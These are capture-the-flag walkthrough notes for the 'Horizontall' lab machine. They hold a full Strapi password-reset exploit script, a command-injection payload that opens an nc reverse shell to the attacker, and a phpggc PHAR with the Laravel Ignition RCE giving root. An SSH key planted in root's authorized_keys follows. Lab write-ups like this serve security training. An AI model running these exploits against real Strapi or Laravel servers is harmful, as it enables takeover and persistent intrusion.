@@ -1,0 +1,318 @@
+let's enumerate first:
+command: sudo rustscan -a 10.10.11.105
+result:
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80 10.10.11.105
+result:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ee774143d482bd3e6e6e50cdff6b0dd5 (RSA)
+|   256 3ad589d5da9559d9df016837cad510b0 (ECDSA)
+|_  256 4a0004b49d29e7af37161b4f802d9894 (ED25519)
+80/tcp open  http    nginx 1.14.0 (Ubuntu)
+|_http-title: horizontall
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT       ADDRESS
+1   121.14 ms 10.10.16.1
+2   90.89 ms  horizontall.htb (10.10.11.105)
+
+please put this 
+10.10.11.105 horizontall.htb api-prod.horizontall.htb
+to /etc/hosts
+
+access: http://horizontall.htb/js/app.c68eb462.js
+take attention:
+{var t=this;r.a.get("http://api-prod.horizontall.htb/reviews").then((function(s){return t.reviews=s.data}))}}},x=y,A=(e("034f"),Object(u["a"])
+http://api-prod.horizontall.htb/reviews
+
+command: ./feroxbuster -u http://horizontall.htb -w /snap/feroxbuster/common/wordlist/raft-medium-directories.txt
+result:
+404      GET        7l       13w      178c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+301      GET        7l       13w      194c http://horizontall.htb/img => http://horizontall.htb/img/
+301      GET        7l       13w      194c http://horizontall.htb/js => http://horizontall.htb/js/
+301      GET        7l       13w      194c http://horizontall.htb/css => http://horizontall.htb/css/
+200      GET        1l        5w      720c http://horizontall.htb/css/app.0f40a091.css
+200      GET        1l       35w     6796c http://horizontall.htb/favicon.ico
+200      GET        2l      394w    18900c http://horizontall.htb/js/app.c68eb462.js
+200      GET       10l     2803w   218981c http://horizontall.htb/css/chunk-vendors.55204a1e.css
+200      GET       55l    86826w  1190830c http://horizontall.htb/js/chunk-vendors.0e02b89e.js
+200      GET        1l       43w      901c http://horizontall.htb/
+[####################] - 19s   120007/120007  0s      found:9       errors:0      
+[####################] - 18s    30000/30000   1654/s  http://horizontall.htb/ 
+[####################] - 18s    30000/30000   1685/s  http://horizontall.htb/img/ 
+[####################] - 18s    30000/30000   1687/s  http://horizontall.htb/js/ 
+[####################] - 18s    30000/30000   1685/s  http://horizontall.htb/css/ 
+
+command: wfuzz --hh 194 -u http://horizontall.htb -H "Host: FUZZZ.horizontal.htb" -w /snap/seclists/34/Discovery/DNS/subdomains-top1million-20000.txt
+result:
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://horizontall.htb/
+Total requests: 19966
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                 
+=====================================================================
+
+
+Total time: 89.48579
+Processed Requests: 19966
+Filtered Requests: 19966
+Requests/sec.: 223.1192
+
+access: http://api-prod.horizontall.htb
+access: http://api-prod.horizontall.htb/reviews
+command: curl http://api-prod.horizontall.htb/reviews | jq .
+result:
+[
+  {
+    "id": 1,
+    "name": "wail",
+    "description": "This is good service",
+    "stars": 4,
+    "created_at": "2021-05-29T13:23:38.000Z",
+    "updated_at": "2021-05-29T13:23:38.000Z"
+  },
+  {
+    "id": 2,
+    "name": "doe",
+    "description": "i'm satisfied with the product",
+    "stars": 5,
+    "created_at": "2021-05-29T13:24:17.000Z",
+    "updated_at": "2021-05-29T13:24:17.000Z"
+  },
+  {
+    "id": 3,
+    "name": "john",
+    "description": "create service with minimum price i hop i can buy more in the futur",
+    "stars": 5,
+    "created_at": "2021-05-29T13:25:26.000Z",
+    "updated_at": "2021-05-29T13:25:26.000Z"
+  }
+]
+
+command: ./feroxbuster -u http://api-prod.horizontall.htb -w /snap/seclists/34/Discovery/DNS/subdomains-top1million-20000.txt
+result:
+404      GET        1l        3w       60c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET       19l       33w      413c http://api-prod.horizontall.htb/
+200      GET      223l     1051w     9230c http://api-prod.horizontall.htb/admin/runtime~main.d078dc17.js
+200      GET       16l      101w      854c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        1l        1w       60c http://api-prod.horizontall.htb/users
+200      GET        1l       21w      507c http://api-prod.horizontall.htb/reviews
+200      GET   136809l   570073w  7001634c http://api-prod.horizontall.htb/admin/main.da91597e.chunk.js
+200      GET       16l      101w      854c http://api-prod.horizontall.htb/admin
+403      GET        1l        1w       60c http://api-prod.horizontall.htb/admin/plugins
+200      GET        1l        1w       90c http://api-prod.horizontall.htb/admin/layout
+[####################] - 62s    39935/39935   0s      found:8       errors:0      
+[####################] - 52s    19965/19965   381/s   http://api-prod.horizontall.htb/ 
+[####################] - 60s    19965/19965   331/s   http://api-prod.horizontall.htb/admin/  
+
+access: http://api-prod.horizontall.htb/admin/
+result:
+strapi
+
+command: curl http://api-prod.horizontall.htb/admin/strapiVersion
+{"strapiVersion":"3.0.0-beta.17.4"}
+
+let's create strapi exploit:
+code:
+import requests
+import sys
+import json
+
+args = sys.argv
+
+if len(args) < 4:
+    print("Usage: {} <admin_email> <url> <new_password>".format(args[0]))
+    exit(-1)
+
+email = args[1]
+url = args[2]
+new_password = args[3]
+
+s = requests.Session()
+
+version = json.loads(s.get("{}/admin/strapiVersion".format(url)).text)
+
+print("[*] Detected version(GET /admin/strapiVersion): {}".format(version["strapiVersion"]))
+
+# Request password reset
+print("[*] Sending password reset request...")
+reset_request={"email": email, "url":"{}/admin/plugins/users-permissions/auth/reset-password".format(url)}
+s.post("{}/".format(url), json=reset_request)
+
+# Reset password to
+print("[*] Setting new password")
+exploit = {"code": {}, "password": new_password, "passwordConfirmation": new_password}
+r = s.post("{}/admin/auth/reset-password".format(url), json=exploit)
+
+print("[*] Response: ")
+print(str(r.content))
+
+command: python3 strapi_exploit_1.py randomjunk http://api-prod.horizontall.htb 0xdf0xdf
+[*] Detected version(GET /admin/strapiVersion): 3.0.0-beta.17.4
+[*] Sending password reset request...
+[*] Setting new password
+[*] Response: 
+b'{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjg4MDY1MTkxLCJleHAiOjE2OTA2NTcxOTF9.eHBYTVAuFNXttK-9DwWSyE-HcuUL_rv3BHF5fWIcvzg","user":{"id":3,"username":"admin","email":"admin@horizontall.htb","blocked":null}}'
+
+let's login 
+username: admin
+password: 0xdf0xdf
+
+some rce exploit on http://api-prod.horizontall.htb/admin/plugins/install
+access: http://api-prod.horizontall.htb/admin/plugins/install
+chaange request using burpsuite to this:
+POST /admin/plugins/install HTTP/1.1
+Host: api-prod.horizontall.htb
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+If-Modified-Since: Wed, 26 May 2021 14:46:44 GMT
+Content-type: application/json
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjg4MDY1MTkxLCJleHAiOjE2OTA2NTcxOTF9.eHBYTVAuFNXttK-9DwWSyE-HcuUL_rv3BHF5fWIcvzg
+Connection: close
+Content-Length: 78
+
+{
+	"plugin": "documentation && $(ping -c 1 10.10.16.19)",
+	"port": "1337"
+}
+
+command: sudo tcpdumo -i tun0 icmp
+result:
+02:05:44.307485 IP horizontall.htb > 10.10.16.19: ICMP echo request, id 8887, seq 1, length 64
+02:05:44.307555 IP 10.10.16.19 > horizontall.htb: ICMP echo reply, id 8887, seq 1, length 64
+02:05:49.654789 IP horizontall.htb > 10.10.16.19: ICMP echo request, id 8940, seq 1, length 64
+02:05:49.654837 IP 10.10.16.19 > horizontall.htb: ICMP echo reply, id 8940, seq 1, length 64
+
+change json payload to this:
+{
+	"plugin": "documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.19 7979 >/tmp/f)",
+	"port": "1337"
+}
+
+command: nc -lvnp 7979
+
+please upgrade the shell
+
+command: netstat -plten
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      0          362798     -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      111        29936      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      0          26579      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          28790      -                   
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1001       31784      1753/node /usr/bin/ 
+tcp6       0      0 :::80                   :::*                    LISTEN      0          26580      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      0          28792      - 
+
+please upload your id_rsa.pub to ~/.ssh/authorized_keys
+
+please tunneling using ssh
+command: ssh -i id_rsa_new strapi@10.10.11.105 -L 8000:localhost:8000
+
+access: http://localhost:8000/
+result: laravel
+
+command: gobuster dir -u http://127.0.0.1:8000 -w /snap/seclists/34/Discovery/Web-Content/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://127.0.0.1:8000
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /snap/seclists/34/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/06/30 02:13:03 Starting gobuster in directory enumeration mode
+===============================================================
+/profiles             (Status: 500) [Size: 616202]
+
+
+access: http://localhost:8000/profiles
+some php deserialization exploit.
+
+command: php -d'phar.readonly=0' /home/donika-pentest/Documents/phpggc/phpggc --phar phar -o id.phar --fast-destruct monolog/rce1 system id
+command: xxd id.phar
+result:
+00000000: 3c3f 7068 7020 5f5f 4841 4c54 5f43 4f4d  <?php __HALT_COM
+00000010: 5049 4c45 5228 293b 203f 3e0d 0a9c 0100  PILER(); ?>.....
+00000020: 0001 0000 0011 0000 0001 0000 0000 0066  ...............f
+00000030: 0100 0061 3a32 3a7b 693a 373b 4f3a 3332  ...a:2:{i:7;O:32
+00000040: 3a22 4d6f 6e6f 6c6f 675c 4861 6e64 6c65  :"Monolog\Handle
+00000050: 725c 5379 736c 6f67 5564 7048 616e 646c  r\SyslogUdpHandl
+00000060: 6572 223a 313a 7b73 3a39 3a22 002a 0073  er":1:{s:9:".*.s
+00000070: 6f63 6b65 7422 3b4f 3a32 393a 224d 6f6e  ocket";O:29:"Mon
+00000080: 6f6c 6f67 5c48 616e 646c 6572 5c42 7566  olog\Handler\Buf
+00000090: 6665 7248 616e 646c 6572 223a 373a 7b73  ferHandler":7:{s
+000000a0: 3a31 303a 2200 2a00 6861 6e64 6c65 7222  :10:".*.handler"
+000000b0: 3b72 3a33 3b73 3a31 333a 2200 2a00 6275  ;r:3;s:13:".*.bu
+000000c0: 6666 6572 5369 7a65 223b 693a 2d31 3b73  fferSize";i:-1;s
+000000d0: 3a39 3a22 002a 0062 7566 6665 7222 3b61  :9:".*.buffer";a
+000000e0: 3a31 3a7b 693a 303b 613a 323a 7b69 3a30  :1:{i:0;a:2:{i:0
+000000f0: 3b73 3a32 3a22 6964 223b 733a 353a 226c  ;s:2:"id";s:5:"l
+00000100: 6576 656c 223b 4e3b 7d7d 733a 383a 2200  evel";N;}}s:8:".
+00000110: 2a00 6c65 7665 6c22 3b4e 3b73 3a31 343a  *.level";N;s:14:
+00000120: 2200 2a00 696e 6974 6961 6c69 7a65 6422  ".*.initialized"
+00000130: 3b62 3a31 3b73 3a31 343a 2200 2a00 6275  ;b:1;s:14:".*.bu
+00000140: 6666 6572 4c69 6d69 7422 3b69 3a2d 313b  fferLimit";i:-1;
+00000150: 733a 3133 3a22 002a 0070 726f 6365 7373  s:13:".*.process
+00000160: 6f72 7322 3b61 3a32 3a7b 693a 303b 733a  ors";a:2:{i:0;s:
+00000170: 373a 2263 7572 7265 6e74 223b 693a 313b  7:"current";i:1;
+00000180: 733a 363a 2273 7973 7465 6d22 3b7d 7d7d  s:6:"system";}}}
+00000190: 693a 373b 693a 373b 7d08 0000 0074 6573  i:7;i:7;}....tes
+000001a0: 742e 7478 7404 0000 0040 d89d 6404 0000  t.txt....@..d...
+000001b0: 000c 7e7f d8b4 0100 0000 0000 0074 6573  ..~..........tes
+000001c0: 746e cc77 1afb ca5d 29b1 8192 e841 2aca  tn.w...])....A*.
+000001d0: c5bd a07d 7302 0000 0047 424d 42         ...}s....GBMB
+
+get exploit from here:
+https://github.com/ambionics/laravel-exploits/blob/main/laravel-ignition-rce.py
+
+command: python3 laravel-ignition-rce.py http://127.0.0.1:8000 id.phar
++ Log file: /home/developer/myproject/storage/logs/laravel.log
++ Logs cleared
++ Successfully converted to PHAR !
++ Phar deserialized
+--------------------------
+uid=0(root) gid=0(root) groups=0(root)
+--------------------------
++ Logs cleared
+
+let's create ssh.phar
+
+php -d'phar.readonly=0' /opt/phpggc/phpggc --phar phar -o ssh.phar --fast-destruct monolog/rce1 system 'mkdir -p /root/.ssh; echo "your id_rsa_new.pub" >> /root/.ssh/authorized_keys'
+command: python3 laravel-ignition-rce.py http://127.0.0.1:8000 ssh.phar
++ Log file: /home/developer/myproject/storage/logs/laravel.log
++ Logs cleared
++ Successfully converted to PHAR !
++ Phar deserialized
+Exploit succeeded
++ Logs cleared
+
+command: ssh -i id_rsa_new root@10.10.11.105
+command: cat /root/root.txt 
+191132f5c7bb388182cbcb651c87bb54
+
+resource:
+https://0xdf.gitlab.io/2022/02/05/htb-horizontall.html
